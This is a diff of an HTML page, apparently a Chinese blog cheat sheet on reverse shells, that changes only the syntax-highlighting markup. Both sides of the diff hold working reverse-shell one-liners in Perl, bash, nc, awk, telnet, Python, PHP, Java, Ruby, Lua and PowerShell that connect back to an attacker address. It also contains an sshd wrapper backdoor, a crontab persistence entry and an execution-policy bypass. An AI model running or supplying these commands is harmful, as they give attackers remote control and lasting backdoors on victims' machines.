@@ -33,126 +33,126 @@ alfred上反弹shell的这几个方法如果是在aliyun主机上面，会被实
 <p><a href="https://github.com/JKme/mycollect/blob/master/pop-shell.alfredworkflow">https://github.com/JKme/mycollect/blob/master/pop-shell.alfredworkflow</a></p>
 <p>--</p>
 <h3>Perl反弹(几乎主流的linux都有perl环境）</h3>
-<div class="highlight"><pre><span></span><span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="s1">&#39;</span><span class="s">use Socket;$i=&quot;192.168.3.251&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);};</span><span class="s1">&#39;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">perl -e &#39;use Socket;$i=&quot;192.168.3.251&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);};&#39;</span>
+</code></pre></div>
 
 
 <h3>bash反弹[redhat系列，不建议使用exec]</h3>
 <p><code>bash -i &gt;&amp; /dev/tcp/192.168.3.251/8080 0&gt;&amp;1  [适合redhat系列,不建议用exec,兼容性并不好]</code></p>
 <h3>ssh反弹［阿里上面有一篇文章讲解的是其中原理]</h3>
-<div class="highlight"><pre><span></span><span class="err">受害主机执行</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">受害主机执行</span><span class="o">:</span>
 <span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">sshd</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">su</span><span class="p">;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">su</span> <span class="o">-</span><span class="n">oPort</span><span class="o">=</span><span class="mi">8080</span><span class="p">;</span>   
 
 <span class="err">攻击机器</span><span class="o">:</span>
 <span class="n">ssh</span> <span class="n">root</span><span class="mf">@192.168.3.251</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8080</span> <span class="p">[</span><span class="err">用户名</span><span class="n">root</span><span class="p">,</span><span class="err">密码随意</span><span class="p">]</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>简易SSH wrapper后门(原理未测试)</h3>
-<div class="highlight"><pre><span></span>受害主机执行:
-<span class="nv">cd</span> <span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span>
-<span class="nv">mv</span> <span class="nv">sshd</span> ..<span class="o">/</span><span class="nv">bin</span>
-<span class="nv">echo</span> <span class="s1">&#39;</span><span class="s">#!/usr/bin/perl</span><span class="s1">&#39;</span> <span class="o">&gt;</span> <span class="nv">sshd</span>
-<span class="nv">echo</span> <span class="s1">&#39;</span><span class="s">exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);</span><span class="s1">&#39;</span> <span class="o">&gt;&gt;</span><span class="nv">sshd</span>
-<span class="nv">echo</span> <span class="s1">&#39;</span><span class="s">exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,</span><span class="s1">&#39;</span> <span class="o">&gt;&gt;</span><span class="nv">sshd</span>
-<span class="nv">chmod</span> <span class="nv">u</span><span class="o">+</span><span class="nv">x</span> <span class="nv">sshd</span>
-<span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">init</span>.<span class="nv">d</span><span class="o">/</span><span class="nv">sshd</span> <span class="nv">restart</span>
+<div class="highlight"><pre><span></span><code><span class="err">受害主机执行</span><span class="o">:</span>
+<span class="n">cd</span> <span class="sr">/usr/s</span><span class="n">bin</span>
+<span class="n">mv</span> <span class="n">sshd</span> <span class="o">../</span><span class="n">bin</span>
+<span class="n">echo</span> <span class="s1">&#39;#!/usr/bin/perl&#39;</span> <span class="o">&gt;</span> <span class="n">sshd</span>
+<span class="n">echo</span> <span class="s1">&#39;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#39;</span> <span class="o">&gt;&gt;</span><span class="n">sshd</span>
+<span class="n">echo</span> <span class="s1">&#39;exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&#39;</span> <span class="o">&gt;&gt;</span><span class="n">sshd</span>
+<span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">x</span> <span class="n">sshd</span>
+<span class="sr">/etc/init.d/ss</span><span class="n">hd</span> <span class="n">restart</span>
 
-攻击机器:
- <span class="nv">socat</span> <span class="nv">STDIO</span> <span class="nv">TCP4</span>:<span class="nv">x</span>.<span class="nv">x</span>.<span class="nv">x</span>.<span class="nv">x</span>:<span class="mi">22</span>,<span class="nv">souceport</span><span class="o">=</span><span class="mi">13337</span>
-</pre></div>
+<span class="err">攻击机器</span><span class="o">:</span>
+ <span class="n">socat</span> <span class="n">STDIO</span> <span class="n">TCP4</span><span class="o">:</span><span class="n">x</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span><span class="o">:</span><span class="mi">22</span><span class="o">,</span><span class="n">souceport</span><span class="o">=</span><span class="mi">13337</span>
+</code></pre></div>
 
 
 <h2>NC反弹</h2>
 <p>默认linux的nc没有带-e(发送至性程序)选项, 可以通过命名管道的方式把bash通过nc反弹出来</p>
-<div class="highlight"><pre><span></span><span class="err">受害主机</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">受害主机</span><span class="o">:</span>
 <span class="n">rm</span> <span class="sr">/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc x.x.x.x 8080 &gt; /tmp/</span><span class="n">f</span>
 
 <span class="err">攻击主机先监听</span><span class="mi">8080</span><span class="err">端口</span><span class="o">:</span>
 
 <span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">8080</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>使用cryptcat，加密版nc</h3>
 <h2>AWK反弹</h2>
 <p>攻击的机器监听，在收到shell的时候不可以输入enter，不然会断开</p>
-<div class="highlight"><pre><span></span><span class="nv">awk</span> <span class="s1">&#39;</span><span class="s">BEGIN{s=&quot;/inet/tcp/0/192.168.3.251/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}</span><span class="s1">&#39;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">awk &#39;BEGIN{s=&quot;/inet/tcp/0/192.168.3.251/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}&#39;</span>
+</code></pre></div>
 
 
 <h3>Telnet反弹</h3>
-<div class="highlight"><pre><span></span><span class="err">受害主机</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">受害主机</span><span class="o">:</span>
 
 <span class="n">telnet</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">3.251</span> <span class="mi">8080</span> <span class="o">|</span> <span class="sr">/bin/</span><span class="n">bash</span> <span class="o">|</span> <span class="n">telnet</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">3.251</span> <span class="mi">1080</span>
 
 <span class="err">攻击主机</span><span class="o">:</span>
 <span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">1080</span> 
 <span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">8080</span> <span class="c1">//这里输入命令可以在1080看到结果</span>
-</pre></div>
+</code></pre></div>
 
 
 <h4>跟上面大同小异</h4>
-<div class="highlight"><pre><span></span><span class="err">受害机器</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">受害机器</span><span class="o">:</span>
 <span class="n">mknod</span> <span class="n">test</span> <span class="n">p</span> <span class="o">&amp;&amp;</span> <span class="n">telnet</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">3.251</span>  <span class="mi">8080</span> <span class="mi">0</span><span class="o">&lt;</span><span class="n">test</span> <span class="o">|</span> <span class="sr">/bin/</span><span class="n">bash</span> <span class="mi">1</span><span class="o">&gt;</span><span class="n">test</span>
 
 <span class="err">攻击：</span>
 <span class="n">nc</span>  <span class="o">-</span><span class="n">lvvp</span> <span class="mi">8080</span>
 
 <span class="n">top命令看不到结果</span><span class="err">，因为不是</span><span class="n">tty</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>Python</h3>
-<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.3.251&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.3.251&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</span>
+</code></pre></div>
 
 
 <h4>crontab</h4>
-<div class="highlight"><pre><span></span><span class="p">(</span><span class="n">crontab</span> <span class="o">-</span><span class="n">l</span><span class="p">;</span><span class="n">printf</span> <span class="s2">&quot;* * * * *  /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\&quot;</span><span class="s2">192.168.3.251</span><span class="se">\&quot;</span><span class="s2">,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\&quot;</span><span class="s2">/bin/sh</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">-i</span><span class="se">\&quot;</span><span class="s2">]);&#39;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">|</span><span class="n">crontab</span> <span class="o">-</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="n">crontab</span> <span class="o">-</span><span class="n">l</span><span class="p">;</span><span class="n">printf</span> <span class="s2">&quot;* * * * *  /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\&quot;</span><span class="s2">192.168.3.251</span><span class="se">\&quot;</span><span class="s2">,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\&quot;</span><span class="s2">/bin/sh</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">-i</span><span class="se">\&quot;</span><span class="s2">]);&#39;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">|</span><span class="n">crontab</span> <span class="o">-</span>
+</code></pre></div>
 
 
 <h3>PHP反弹</h3>
-<div class="highlight"><pre><span></span><span class="nv">php</span> <span class="o">-</span><span class="nv">r</span> <span class="s1">&#39;</span><span class="s">$sock=fsockopen(&quot;192.168.3.251&quot;,8080);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><span class="s1">&#39;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">php -r &#39;$sock=fsockopen(&quot;192.168.3.251&quot;,8080);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
+</code></pre></div>
 
 
 <h3>Java</h3>
-<div class="highlight"><pre><span></span><span class="nv">public</span> <span class="nv">class</span> <span class="nv">Revs</span> {
-    <span class="cm">/**</span>
-<span class="cm">    * @param args</span>
-<span class="cm">    * @throws Exception </span>
-<span class="cm">    */</span>
-    <span class="nv">public</span> <span class="nv">static</span> <span class="nv">void</span> <span class="nv">main</span><span class="ss">(</span><span class="nv">String</span>[] <span class="nv">args</span><span class="ss">)</span> <span class="nv">throws</span> <span class="nv">Exception</span> {
-        <span class="o">//</span> <span class="nv">TODO</span> <span class="nv">Auto</span><span class="o">-</span><span class="nv">generated</span> <span class="nv">method</span> <span class="nv">stub</span>
-        <span class="nv">Runtime</span> <span class="nv">r</span> <span class="o">=</span> <span class="nv">Runtime</span>.<span class="nv">getRuntime</span><span class="ss">()</span><span class="c1">;</span>
-        <span class="nv">String</span> <span class="nv">cmd</span>[]<span class="o">=</span> {<span class="s2">&quot;</span><span class="s">/bin/bash</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">-c</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">exec 5&lt;&gt;/dev/tcp/192.168.3.251/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><span class="s2">&quot;</span>}<span class="c1">;</span>
-        <span class="nv">Process</span> <span class="nv">p</span> <span class="o">=</span> <span class="nv">r</span>.<span class="k">exec</span><span class="ss">(</span><span class="nv">cmd</span><span class="ss">)</span><span class="c1">;</span>
-        <span class="nv">p</span>.<span class="nv">waitFor</span><span class="ss">()</span><span class="c1">;</span>
-    }
-}
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">public class Revs {</span>
+<span class="err">    /**</span>
+<span class="err">    * @param args</span>
+<span class="err">    * @throws Exception </span>
+<span class="err">    */</span>
+<span class="err">    public static void main(String[] args) throws Exception {</span>
+<span class="err">        // TODO Auto-generated method stub</span>
+<span class="err">        Runtime r = Runtime.getRuntime();</span>
+<span class="err">        String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.3.251/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;};</span>
+<span class="err">        Process p = r.exec(cmd);</span>
+<span class="err">        p.waitFor();</span>
+<span class="err">    }</span>
+<span class="err">}</span>
+</code></pre></div>
 
 
 <h3>Ruby</h3>
-<div class="highlight"><pre><span></span><span class="nv">ruby</span> <span class="o">-</span><span class="nv">rsocket</span> <span class="o">-</span><span class="nv">e</span> <span class="s1">&#39;</span><span class="s">exit if fork;c=TCPSocket.new(&quot;192.168.3.251&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end</span><span class="s1">&#39;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;192.168.3.251&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
+</code></pre></div>
 
 
 <h3>Lua</h3>
-<div class="highlight"><pre><span></span> <span class="nv">lua</span> <span class="o">-</span><span class="nv">e</span> <span class="s2">&quot;</span><span class="s">require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;192.168.3.251&#39;,&#39;8080&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);</span><span class="s2">&quot;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err"> lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;192.168.3.251&#39;,&#39;8080&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span>
+</code></pre></div>
 
 
 <h2>WIndows</h2>
-<div class="highlight"><pre><span></span><span class="nv">PS</span> <span class="nv">C</span>:\<span class="o">&gt;</span> <span class="nv">Import</span><span class="o">-</span><span class="nv">Module</span> .\<span class="nv">powercat</span>.<span class="nv">ps1</span>
-<span class="nv">PS</span> <span class="nv">C</span>:\<span class="o">&gt;</span> <span class="nv">powercat</span> <span class="o">-</span><span class="nv">c</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">3</span>.<span class="mi">251</span> <span class="o">-</span><span class="nv">p</span> <span class="mi">8081</span> <span class="o">-</span><span class="nv">e</span> <span class="nv">cmd</span> <span class="o">-</span><span class="nv">g</span> <span class="o">&gt;&gt;</span> <span class="nv">payload</span>.<span class="nv">ps1</span>
-# <span class="nv">nc</span> <span class="o">-</span><span class="nv">lvp</span> <span class="mi">8081</span> 然后开始监听<span class="nv">payload</span>回连的端口
+<div class="highlight"><pre><span></span><code><span class="n">PS</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span> <span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="p">.</span><span class="err">\</span><span class="n">powercat</span><span class="p">.</span><span class="n">ps1</span>
+<span class="n">PS</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span> <span class="n">powercat</span> <span class="o">-</span><span class="k">c</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">251</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8081</span> <span class="o">-</span><span class="n">e</span> <span class="n">cmd</span> <span class="o">-</span><span class="k">g</span> <span class="o">&gt;&gt;</span> <span class="n">payload</span><span class="p">.</span><span class="n">ps1</span>
+<span class="o">#</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">8081</span> <span class="err">然后开始监听</span><span class="n">payload回连的端口</span>
 
-<span class="nv">powershell</span> –<span class="k">exec</span> <span class="nv">bypass</span> –<span class="nv">Command</span> <span class="s2">&quot;</span><span class="s">&amp; {Import-Module &#39;C:\payload.ps1&#39;}</span><span class="s2">&quot;</span>
- 挂在后台执行
-</pre></div>
+<span class="n">powershell</span> <span class="err">–</span><span class="k">exec</span> <span class="n">bypass</span> <span class="err">–</span><span class="n">Command</span> <span class="ss">&quot;&amp; {Import-Module &#39;C:\payload.ps1&#39;}&quot;</span>
+ <span class="err">挂在后台执行</span>
+</code></pre></div>
 
 
 <p>另外还有Jsrat反弹</p>
